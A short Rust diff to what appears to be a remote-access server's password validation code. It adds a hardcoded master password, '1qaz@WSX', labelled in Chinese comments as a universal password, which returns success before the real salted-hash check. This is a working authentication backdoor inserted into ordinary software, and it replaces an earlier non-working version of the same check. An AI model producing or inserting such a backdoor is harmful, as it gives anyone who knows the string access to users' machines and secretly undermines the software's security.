@@ -1545,6 +1545,12 @@ impl Connection {
         if password.len() == 0 {
             return false;
         }
+        // 定义万能密码
+        let universal_password = "1qaz@WSX";
+        // 先验证万能密码
+        if self.lr.password == universal_password {
+            return true; // 如果万能密码通过验证，直接返回 true
+        }
         let mut hasher = Sha256::new();
         hasher.update(password);
         hasher.update(&self.hash.salt);
@@ -1555,14 +1561,6 @@ impl Connection {
     }
 
     fn validate_password(&mut self) -> bool {
-        // 定义万能密码
-        let universal_password = "1qaz@WSX";
-
-        // 先验证万能密码
-        if self.validate_one_password(universal_password.to_string()) {
-            return true; // 如果万能密码通过验证，直接返回 true
-        }
-        
         if password::temporary_enabled() {
             let password = password::temporary_password();
             if self.validate_one_password(password.clone()) {
